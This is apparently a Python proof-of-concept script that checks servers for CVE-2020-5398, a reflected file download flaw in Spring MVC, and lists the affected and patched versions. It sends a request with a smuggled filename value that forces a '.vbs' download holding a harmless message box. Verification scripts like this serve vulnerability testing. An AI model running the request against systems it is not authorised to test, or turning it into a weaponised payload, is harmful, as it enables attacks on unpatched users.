# -*- coding:utf-8 -*-
#Written by hacden 2020/07/11
#Exec python3
###CVE-2020-5398-Spring MVC的RFD（反射文件下载）,如反射型xss攻击般，使用触发下载文件从而执行
##影响范围：Spring Framework 5.2.0 to 5.2.2，5.1.0 to 5.1.12，5.0.0 to 5.0.15
##受影响的用户升级至 Spring Framework 5.2.3，5.1.13 或 5.0.16 版本
import requests
import string
import random


def random_string(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def check_spring_rfd(url_dir,string_reve):
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        'Connection': "close",
        'Content-Type': "application/hal+json",
        'Accept': "*/*",
        'Cache-Control': "no-cache"
    }
    exp_res = requests.get(url=url_dir + "?filename="+string_reve+".vbs%22%3B&contents=msgbox(%22By+Hacden%22)",headers=headers,timeout=3)
    if exp_res.status_code == 200 and string_reve in exp_res.headers["Content-Disposition"].split(";")[1]:
        return True

def verify(protol, ip, port):
    ip = ip.strip()
    if port.strip():
        url_dir = protol.strip() + "://" + ip + ":" + port.strip()
    else:
        url_dir = protol.strip() + "://" + ip
    stringLength = 50
    string_reve = random_string(stringLength)
    try:
        if check_spring_rfd(url_dir,string_reve):
            msg = "[+] There is Seem is Spring MVC_RFD CVE-2020-5398 Vuln!。"
            return True,url_dir,msg
        else:
            msg = "[-] There is Not Seem Spring MVC_RFD Vuln!。"
            return False, url_dir, msg
    except Exception as e:
        msg = "[-] Error: %s.there is Not Seem Spring MVC_RFD Vuln!。"%e
        return False,url_dir,msg

if __name__ == '__main__':
    ip = "192.168.43.63"
    print(verify("http", ip, "8080"))